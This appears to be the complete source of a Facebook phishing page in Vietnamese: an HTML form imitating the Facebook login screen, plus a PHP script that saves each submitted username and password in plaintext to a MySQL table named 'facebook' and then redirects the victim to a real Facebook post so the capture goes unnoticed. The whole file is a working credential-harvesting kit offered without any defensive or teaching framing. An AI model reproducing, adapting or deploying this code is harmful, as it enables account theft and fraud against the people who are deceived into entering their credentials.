<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập Facebook</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f2f5;
        }
        .login-container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .error-message {
            color: red;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <form class="login-container" method="post" action="">
        <h2>Đăng nhập Facebook</h2>
        <input type="text" name="username" placeholder="Email hoặc số điện thoại" required>
        <input type="password" name="password" placeholder="Mật khẩu" required>
        <button type="submit">Đăng nhập</button>
        <p class="error-message" id="error"></p>
    </form>
</body>
</html>

<?php 
include "csdl.php";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = trim($_POST['username']);
    $pass = trim($_POST['password']);

    if (!$conn) {
        die("Lỗi kết nối: " . mysqli_connect_error());
    }

    // Dùng prepared statements để tránh SQL Injection
    $sql = "INSERT INTO facebook (tentaikhoan, matkhau) VALUES (?, ?)";
    $stmt = mysqli_prepare($conn, $sql);

    if ($stmt) {
        mysqli_stmt_bind_param($stmt, "ss", $name, $pass);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    } else {
        die("Lỗi truy vấn: " . mysqli_error($conn));
    }

    mysqli_close($conn);

    // Chuyển hướng sau khi xử lý
    header("Location: https://www.facebook.com/share/p/1BCuDdkXnc/");
    exit();
}
?>
